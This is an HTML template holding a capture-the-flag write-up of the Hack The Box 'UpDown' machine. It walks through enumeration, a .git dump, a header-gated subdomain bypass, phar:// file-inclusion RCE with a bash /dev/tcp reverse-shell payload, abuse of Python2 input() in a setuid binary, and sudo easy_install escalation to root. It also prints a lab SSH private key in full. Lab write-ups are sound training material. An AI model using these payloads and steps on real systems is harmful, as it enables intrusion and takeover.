@@ -1,0 +1,335 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}"> 
+</head>
+<body>
+    <h1 class="title">HTB UpDown</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV TARGET_IP --min-rate=2000 > nmap.txt</u>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 01:29 EDT
+Nmap scan report for siteisup.htb (10.129.227.227)
+Host is up (0.29s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
+|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
+|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Is my Website up ?
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+
+    <p class="text">As usual, HTTP is the main target. Let's enumerate this website and collect information. Before access to the webisite, add the domain name to the hosts file.</p>
+
+    <div class="code-box"><pre><code>└─$ <u>echo 'TARGET_IP siteisup.htb' | sudo tee -a /etc/hosts</u></code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/updown/1-website.png' %}" alt="">
+        <p class="text">This website can check if the target site is up or down. It looks like we can LFI, but let's enumerate the website before we try it.</p>
+    </div>
+
+    <div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://siteisup.htb -t 70</u>
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+<u>/dev</u>                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]                                                  
+/index.php            (Status: 200) [Size: 1131]
+/server-status        (Status: 403) [Size: 277]
+Progress: 4746 / 4747 (99.98%)
+===============================================================
+Finished
+===============================================================</code></pre></div>
+
+    <p class="text">Simultaneously, let's check if there is a subdomain.</p>
+    <div class="code-box"><pre><code>└─$ <u>ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://siteisup.htb/ -H "Host:FUZZ.siteisup.htb" -s -mc 200
+</u>---------------------------------------------snip---------------------------------------------
+www                     [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 247ms]
+:: Progress: [40/100000] :: Job [1/1] :: 0 req/sec :: Duration: ftp                     [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 254ms]
+:: Progress: [41/100000] :: Job [1/1] :: 0 req/sec :: Duration: vpn                     [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 255ms]
+:: Progress: [42/100000] :: Job [1/1] :: 0 req/sec :: Duration: :: Progress: [43/100000] :: Job [1/1] :: 0 req/sec :: Duration: blog                    [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 249ms]
+---------------------------------------------snip---------------------------------------------</code></pre></div>
+
+    <p class="text">It returns all words in wordlist with size 1131. Exclude the data length and retry subdomain enumeration.</p>
+
+
+    <div class="code-box"><pre><code>└─$ <u>ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://siteisup.htb/ -H "Host:FUZZ.siteisup.htb" -fs 1131</u>
+________________________________________________
+
+<u>dev</u>                     [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 4824ms]</code></pre></div>
+
+    <p class="text">ffuf revealed a new subdomain. Let's add to host list.</p>
+
+    <div class="code-box"><pre><code>└─$ <u>echo 'TARGET_IP dev.siteisup.htb' | sudo tee -a /etc/hosts</u></code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/updown/2-forbidden.png' %}" alt="">
+        <p class="text">However, we cannot access to the subdomain directly. Therefore, we should keep track with siteisup.htb. Look at the result of gobuster. There is an interesting output "/dev". It may include juicy information. Let's forward directory enumeration.</p>
+    </div>
+
+
+
+    <div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://siteisup.htb/dev/ -t 70</u>
+---------------------------------------------snip---------------------------------------------
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.git/logs/           (Status: 200) [Size: 1143]
+/.git/HEAD            (Status: 200) [Size: 21]
+/.git/config          (Status: 200) [Size: 298]
+/.htaccess            (Status: 403) [Size: 277]
+/.hta                 (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+<u>/.git</u>                 (Status: 301) [Size: 315] [--> http://siteisup.htb/dev/.git/]
+/.git/index           (Status: 200) [Size: 521]
+---------------------------------------------snip---------------------------------------------</code></pre></div>
+
+
+    <p class="text">We can see it returned .git directory. In this case, we might be able to gather Git repository information. We can do this by using git-dumper.</p>
+
+    <div class="code-box"><pre><code>└─$ <u>git-dumper http://siteisup.htb/dev/.git ~/tmp/dev</u></code></pre></div>
+
+    <p class="text">And on the created directory...</p>
+
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/dev]
+└─$ ls -a           
+.  ..  admin.php  changelog.txt  checker.php  .git  .htaccess  index.php  stylesheet.css</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/dev]
+└─$ cat .htaccess
+<u>SetEnvIfNoCase Special-Dev "only4dev" Required-Header</u>
+Order Deny,Allow
+Deny from All
+<u>Allow from env=Required-Header</u>
+</code></pre></div>
+
+
+    <h2 class="subtitle">Foothold</h2>
+
+    <p class="text">Do you remember that the subdomain we found forbidd direct access? As we can see, the header should enable us to entry the subdomain.</p>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/updown/3-proxy.png' %}" alt="">
+        <p class="text">We can add the header manually, but it's more useful to automate editing header. Open burpsuite -> settings -> proxy -> HTTP match and replace rules, and type info like this.</p>
+    </div>
+
+    <p class="text">It automatically adds header...</p>
+    <div class="code-box"><pre><code>GET /dev/.git HTTP/1.1
+Host: siteup.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+<u>Special-Dev: only4dev</u></code></pre></div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/updown/4-dev.png' %}" alt="">
+    <p class="text">It made the subdomain 'dev.siteisup.htb' accessible. And look at the page. We can add the file to the website. File upload vulnerability might be exploitable.</p>
+</div>
+
+    <p class="text">We got source codes of this page with .git directory. For further step, let's observe those codes.</p>
+
+<div class="code-box"><pre><code><b>/index.php
+&lt;?php
+    define("DIRECTACCESS", false);
+    $page = $_GET['page'];
+    if ($page && !preg_match("/bin|usr|home|var|etc/i", $page)) {
+        include($_GET['page'] . ".php");
+    } else {
+        include("checker.php");
+    }
+?&gt;</b></code></pre></div>
+
+    <p class="text">It prevents local file inclusion and blocks us from accessing outside directories like /etc. If there is no <u>page GET parameter</u> is supplied, the page will include checker.php. Let's check the file.</p>
+
+
+    <div class="code-box"><pre><code><b>if($_POST['check']){
+  
+        # File size must be less than 10kb.
+        if ($_FILES['file']['size'] > 10000) {
+        die("File too large!");
+    }
+        $file = $_FILES['file']['name'];
+
+        # Check if extension is allowed.
+        $ext = getExtension($file);
+        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
+                die("Extension not allowed!");
+        }
+  
+        # Create directory to upload our file.
+        $dir = <u>"uploads/".md5(time())."/";</u>
+        if(!is_dir($dir)){
+        mkdir($dir, 0770, true);
+        }</b></code></pre></div>
+
+        <p class="text">This file checks the file size and file extension. If there is no problem, create directory which is time encoded into md5 under the uploads directory.</p>
+        <p class="text">In this case, we can make use of vulnerability of the blacklist. To make it safe file upload with black list, we have to block all possible file extensions. If you want to establish secure usage, you need to use whitelist in this case.</p>
+        <p class="text">Although it blocks several file extension, we can use <u>phar://</u>.</p>
+        <p class="text"><b>※phar:// is a PHP stream wrapper that lets you access files inside PHAR (PHP Archive) packages like zip/tar. It's often exploited for deserialization or LFI-based RCE attacks.</b></p>
+
+        <p class="text">Now, we know we can use phar://, but we don't know which funcitons/classes are available for establishing reverse shell. So we need to collect extra info. To do that, we can use <u>phpinfo()</u>.</p>
+
+        <div class="code-box"><pre><code>└─$ echo "&lt;?php phpinfo(); ?>" > info.php
+└─$ zip info.zip info.php
+└─$ mv info.zip info.txt</code></pre></div>
+    
+        <p class="text">Then, we upload this file and navigate to http://dev.siteisup.htb/uploads/. Make sure you using burpsuite because we need special header to see subdomain pages.</p>
+        <p class="text">After uploading the file, check the directory because it would be unique name. Next step is, construct the url like this...</p>
+        <p class="text"><u>http://dev.siteisup.htb/?page=phar://uploads/2623af157bb87c9be73b9a8f397082b6/info.txt/info</u> and visit via burpsuite again.</p>
+
+
+        <div class="img">
+            <img src="{% static 'EthHack/images/updown/5-info.png' %}" alt="">
+            <p class="text">We can see lots of functions are forbidden, but with little research, it revealed that <u>proc_open</u> is available for RCE. Let's create paylaod like before.</p>
+        </div>
+
+        <div class="code-box"><pre><code><b>&lt;?php
+        $descspec = array(
+                0 => array("pipe", "r"),
+                1 => array("pipe", "w"),
+                2 => array("pipe", "w")
+        );
+        $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'";
+        $proc = proc_open($cmd, $descspec, $pipes);
+?></b></code></pre></div>
+        <div class="code-box"><pre><code>└─$ zip rce.zip rce.php
+└─$ mv rce.zip rce.txt</code></pre></div>
+
+
+    <p class="text">And just like before, construct url like this <u>http://dev.siteisup.htb/?page=phar://uploads/1caa46f242d146ca56690ab943ef37e2/rce.txt/rce</u>, and access to the file via burpsuite. </p>
+
+    <div class="code-box"><pre><code>└─$ <u>nc -lvnp 4444</u>
+listening on [any] 4444 ...
+connect to [10.10.14.13] from (UNKNOWN) [10.129.227.227] 40056
+bash: cannot set terminal process group (896): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@updown:/var/www/dev$</code></pre></div>
+
+    <p class="text">We got reverse shell.</p>
+
+    <h2 class="subtitle">Lateral Movement</h2>
+    <p class="text">In the /home directory, we can find an user 'developer', and take a look at his/her home. There is a file named siteisup.</p>
+
+    <div class="code-box"><pre><code><b>import requests
+url = input("Enter URL here:")
+page = requests.get(url)
+if page.status_code == 200:
+print "Website is up"
+else:
+print "Website is down"</b></code></pre></div>
+
+        <p class="text">It's known that the function <u>input</u> acts like eval() function in python2. Therefore, we can simply type python code which opens shell. </p>
+        <div class="code-box"><pre><code>developer@updown:/home/developer/dev$ ls -la
+total 32
+drwxr-x--- 2 developer www-data   4096 Jun 22  2022 .
+drwxr-xr-x 6 developer developer  4096 Aug 30  2022 ..
+-rwsr-x--- 1 developer www-data  16928 Jun 22  2022 siteisup
+-rwxr-x--- 1 developer www-data    154 Jun 22  2022 siteisup_test.py
+</code></pre></div>
+        <p class="text">Because the file holder is developer account, the file has a privilege as developer. When we execute shell, this file would execute it as developer.</p>
+
+        <div class="code-box"><pre><code>/siteisup
+__import__('os').system('/bin/bash')</code></pre></div>
+<p class="text">We got the developer account.</p>
+
+
+    <p class="text">Also, this account has .ssh file. Therefore, we can access to the target machine with id_rsa.</p>
+
+    <div class="code-box"><pre><code>developer@updown:/home/developer/dev$ cat /home/developer/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div>
+
+    <p class="text">On your local machine, copy and paste this file and...</p>
+
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ chmod 600 id_rsa
+└─$ ssh -i id_rsa developer@siteisup.htb
+</code></pre></div>
+
+
+
+    <h2 class="subtitle">PriEsc</h2>
+
+
+    <div class="code-box"><pre><code>developer@updown:~$ <u>sudo -l</u>
+Matching Defaults entries for developer on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User developer may run the following commands on
+        localhost:
+    (ALL) NOPASSWD: /usr/local/bin/easy_install
+</code></pre></div>
+
+    <p class="text">Fortunately, GTFOBin informs the way to exploit easy_install.</p>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/updown/6-gtfob.png' %}" alt="">
+        <p class="text">We can simply follow instrunctions.</p>
+    </div>
+
+
+    <div class="code-box"><pre><code><b>TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo easy_install $TF</b></code></pre></div>
+
+
+    <p class="text">You notice you have root id.</p>
+
+    <div class="code-box"><pre><code><b># id
+uid=0(root) gid=0(root) groups=0(root)
+</b></code></pre></div>
+</body>
+</html>
